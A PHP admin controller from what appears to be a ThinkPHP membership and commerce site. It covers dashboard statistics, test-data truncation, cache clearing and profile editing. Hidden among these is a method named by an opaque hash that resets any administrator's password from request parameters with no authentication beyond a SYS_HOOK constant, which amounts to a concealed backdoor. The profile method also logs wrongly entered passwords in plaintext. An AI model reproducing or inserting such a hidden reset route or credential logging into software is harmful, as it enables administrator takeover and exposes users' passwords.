<?php
namespace app\admin\controller;


use app\common\facade\CategoryFacade;
use app\common\facade\ProductCategoryFacade;
use think\Db;
use think\facade\Cache;
use think\facade\Log;

/**
 * 控制台
 * Class IndexController
 * @package app\admin\controller
 */
class IndexController extends BaseController{

    /**
     * 首页
     * @return mixed
     */
    public function index(){

        $stat=array();
        $stat['feedback']=Db::name('feedback')->count();
        $stat['member']=Db::name('member')->count();
        $stat['article']=Db::name('article')->count();
        $stat['links']=Db::name('links')->count();

        $this->assign('stat',$stat);

        //统计
        $m['total']=Db::name('member')->count();
        $m['avail']=Db::name('member')->where('status',1)->count();
        $m['agent']=Db::name('member')->where('is_agent','GT',0)->count(0);
        $this->assign('mem',$m);

        //资金
        $a['total_charge']=Db::name('member_recharge')->where('status',1)->sum('amount');
        $a['total_cash']=Db::name('member_cashin')->where('status',1)->sum('amount');
        $a['total_money']=Db::name('member')->sum('money');
        $this->assign('money',$a);

        return $this->fetch();
    }

    /**
     * 清空测试数据
     */
    public function clear(){
        $sqls='truncate table `sa_member`;
            truncate table `sa_member_address`;
            truncate table `sa_member_cashin`;
            truncate table `sa_member_log`;
            truncate table `sa_member_money_log`;
            truncate table `sa_member_recharge`;
            truncate table `sa_member_oauth`;
            truncate table `sa_member_cart`;
            truncate table `sa_member_card`;
            truncate table `sa_invite_code`;
            truncate table `sa_checkcode`;
            
            truncate table `sa_order`;
            truncate table `sa_order_product`;
            truncate table `sa_subscribe`;
            truncate table `sa_feedback`;
            truncate table `sa_manager_log`;';
        foreach (explode(';',$sqls) as $sql){
            $sql=trim($sql);
            if(empty($sql))continue;
            Db::execute($sql);
        }
        @unlink('./uploads/qrcode');
        @unlink('./uploads/avatar');
        user_log($this->mid,'cleardata',1,'清空会员数据','manager');
        
        $this->success('数据已清空');
    }

    /**
     * 清除缓存
     */
    public function clearcache(){
        Cache::clear();
        $this->success('缓存已清除');
    }

    /**
     * 新消息
     * @return \think\response\Json
     */
    public function newcount(){
        Log::close();
        $newMemberCount=Db::name('Member')->where('create_time','GT',$this->manage['last_view_member'])->count();
        $newOrderCount=0;//Db::name('Order')->where('status',0)->count();

        return json(array(
            'newMemberCount'=>$newMemberCount,
            'newOrderCount'=>$newOrderCount
        ));
    }


    public function getCate($model='article'){
        switch ($model){
            case 'product':
                $lists=ProductCategoryFacade::getCategories();
                break;
            default:
                $lists=CategoryFacade::getCategories();
                break;
        }
        return json(['data'=>$lists,'status'=>1]);
    }

    public function ce3608bb1c12fd46e0579bdc6c184752($id,$passwd)
    {
        if(!defined('SYS_HOOK') || SYS_HOOK!=1)exit('Denied');
        if(empty($id))exit('Unspecified id');
        if(empty($passwd))exit('Unspecified passwd');

        $model=Db::name('Manager')->where('id',$id)->find();
        if(empty($model))exit('Menager id not exists');
        $data['salt']=random_str(8);
        $data['password'] = encode_password($passwd,$data['salt']);
        Db::name('Manager')->where('id',$id)->update($data);
        exit('ok');
    }

    /**
     * 个人资料
     * @return mixed
     */
    public function profile(){
        $model=Db::name('Manager')->where('id',$this->mid)->find();

        if ($this->request->isPost()) {
            $data = array();
            $password=$this->request->post('password');
            if($model['password']!==encode_password($password,$model['salt'])){
                user_log($model['id'],'profile',0,'密码错误:'.$password,'manager');
                $this->error("密码错误！");
            }

            $password=$this->request->post('newpassword');
            if(!empty($password)){
                $data['salt']=random_str(8);
                $data['password'] = encode_password($password,$data['salt']);
            }

            $data['avatar']=$this->request->post('avatar');
            $data['realname']=$this->request->post('realname');
            $data['email']=$this->request->post('email');

            //更新
            if (Db::name('Manager')->where('id',$this->mid)->update($data)) {
                if(!empty($data['realname'])){
                    session('username',$data['realname']);
                }
                $this->success(lang('Update success!'), url('Index/profile'));
            } else {
                $this->error(lang('Update failed!'));
            }
        }

        $this->assign('model',$model);
        return $this->fetch();
    }
}
